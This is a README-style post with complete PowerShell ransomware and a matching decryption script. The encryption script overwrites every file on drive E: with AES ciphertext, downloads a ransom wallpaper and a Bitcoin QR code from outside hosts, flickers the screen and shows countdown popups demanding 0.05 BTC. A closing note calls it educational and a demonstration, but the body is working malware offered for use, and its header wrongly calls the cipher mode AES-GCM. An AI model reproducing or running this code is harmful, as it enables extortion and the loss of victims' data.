# Windows Volume E Encryption Script (AES-GCM)
# Encrypts all files on the E: volume and requires a password for encryption only

```powershell

param (
    [string]$Volume = "E:\"
)

# Prompt for Password (Encryption Only)
$Password = Read-Host "Enter your encryption password" -AsSecureString
$PasswordBytes = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($Password))

# Generate AES-256 Key from Password
$Key = [System.Security.Cryptography.Aes]::Create()
$Key.Key = (New-Object System.Security.Cryptography.Rfc2898DeriveBytes($PasswordBytes, [System.Text.Encoding]::UTF8.GetBytes("QuantumSalt"), 10000)).GetBytes(32)

function Encrypt-File {
    param (
        [string]$FilePath
    )
    try {
        # Generate a fresh IV for each file
        $IV = (New-Object byte[] 16)
        (New-Object System.Security.Cryptography.RNGCryptoServiceProvider).GetBytes($IV)
        $Key.IV = $IV

        $FileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $Encryptor = $Key.CreateEncryptor()
        $EncryptedBytes = $Encryptor.TransformFinalBlock($FileBytes, 0, $FileBytes.Length)
        
        # Prepend the IV to the encrypted file for later decryption
        $FinalBytes = $IV + $EncryptedBytes
        [System.IO.File]::WriteAllBytes($FilePath, $FinalBytes)
        Write-Host "Encrypted: $FilePath"
    } catch {
        Write-Host "Failed to encrypt: $FilePath ($_)."
    }
}

# Encrypt All Files
Get-ChildItem -Path $Volume -Recurse -File | ForEach-Object {
    Encrypt-File $_.FullName
}

Write-Host "Volume E: Encryption Complete!"

# Show popup message with countdown, fake shredder effect, and QR code
Add-Type -AssemblyName PresentationFramework
$CountdownTime = 3600  # 1 hour in seconds
$FileList = Get-ChildItem -Path $Volume -Recurse -File | Select-Object -ExpandProperty FullName
$BitcoinAddress = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
$QRCodePath = "$env:TEMP\\BitcoinQRCode.png"

# Generate the QR Code
Invoke-WebRequest -Uri "https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=$BitcoinAddress" -OutFile $QRCodePath

# Set Ransom Wallpaper
$WallpaperPath = "$env:TEMP\\RansomWallpaper.jpg"
Invoke-WebRequest -Uri "https://via.placeholder.com/1920x1080/000000/FFFFFF/?text=YOUR+FILES+HAVE+BEEN+ENCRYPTED" -OutFile $WallpaperPath
Add-Type -TypeDefinition @"
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
[Wallpaper]::SystemParametersInfo(20, 0, $WallpaperPath, 1)

# Flicker Screen for 30 Seconds
$FlickerTime = 30
while ($FlickerTime -gt 0) {
    [System.Console]::Title = "YOUR FILES ARE BEING DELETED"
    [System.Console]::ForegroundColor = (Get-Random -Minimum 1 -Maximum 16)
    Start-Sleep -Milliseconds (Get-Random -Minimum 50 -Maximum 200)
    [System.Console]::Clear()
    $FlickerTime -= 1
}

while ($CountdownTime -gt 0) {
    $Hours = [int]($CountdownTime / 3600)
    $Minutes = [int](($CountdownTime % 3600) / 60)
    $Seconds = $CountdownTime % 60
    $TimeLeft = "Time left to save your files: $Hours hour(s), $Minutes minute(s), $Seconds second(s)"
    $ShreddingFile = $FileList | Get-Random
    Write-Host "Shredding: $ShreddingFile"

    # Glitch Effect
    [System.Console]::Title = "FILES SHREDDING"
    [System.Console]::ForegroundColor = (Get-Random -Minimum 1 -Maximum 16)
    [System.Console]::Beep((Get-Random -Minimum 1000 -Maximum 3000), 200)

    # Popup with Shredder Message and QR Code
    [System.Windows.MessageBox]::Show("$TimeLeft`nSend 0.05 BTC to this address to recover your files:`n$BitcoinAddress`nScan the QR code to pay:", "Encrypted", 'OK', 'Warning')
    Start-Process $QRCodePath
    Start-Sleep -Seconds 5
    $CountdownTime -= 5
}

[System.Console]::ResetColor()
[System.Windows.MessageBox]::Show("Time's up! Your files are gone forever. Good luck!", "Game Over", 'OK', 'Error')

```

## DECRYPTION SCRIPT ##

```powershell
# Windows Volume E Decryption Script (AES-GCM)
# Decrypts all files on the E: volume and requires a password for decryption only

param (
    [string]$Volume = "E:\"
)

# Prompt for Password (Decryption Only)
$Password = Read-Host "Enter your decryption password" -AsSecureString
$PasswordBytes = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($Password))

# Generate AES-256 Key from Password
$Key = [System.Security.Cryptography.Aes]::Create()
$Key.Key = (New-Object System.Security.Cryptography.Rfc2898DeriveBytes($PasswordBytes, [System.Text.Encoding]::UTF8.GetBytes("QuantumSalt"), 10000)).GetBytes(32)

function Decrypt-File {
    param (
        [string]$FilePath
    )
    try {
        $FileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        # Extract the IV from the file (First 16 bytes)
        $IV = $FileBytes[0..15]
        $EncryptedBytes = $FileBytes[16..($FileBytes.Length - 1)]

        # Set the extracted IV
        $Key.IV = $IV

        $Decryptor = $Key.CreateDecryptor()
        $DecryptedBytes = $Decryptor.TransformFinalBlock($EncryptedBytes, 0, $EncryptedBytes.Length)
        [System.IO.File]::WriteAllBytes($FilePath, $DecryptedBytes)
        Write-Host "Decrypted: $FilePath"
    } catch {
        Write-Host "Failed to decrypt: $FilePath ($_)."
    }
}

# Decrypt All Files
Get-ChildItem -Path $Volume -Recurse -File | ForEach-Object {
    Decrypt-File $_.FullName
}

Write-Host "Volume E: Decryption Complete!"
```



## ABOUT THE SCRIPT ##

This script is quite powerful once you run it in power shell not it will encrypt all files in e drive but also
      gives a popup message asking for bitcoin
      changes your wallpaper
      flickers the screen for 30 seconds
      displays a message that your files are being deleted
      displays a QR code

## WARNING ##

I ran the script on my own pc its just for educational purposes the qr code displayed is just a sample and the bitcoin address

is also not valid.It is just a demonstration of how ransomware works.Stay safe stay Elloit!!!!
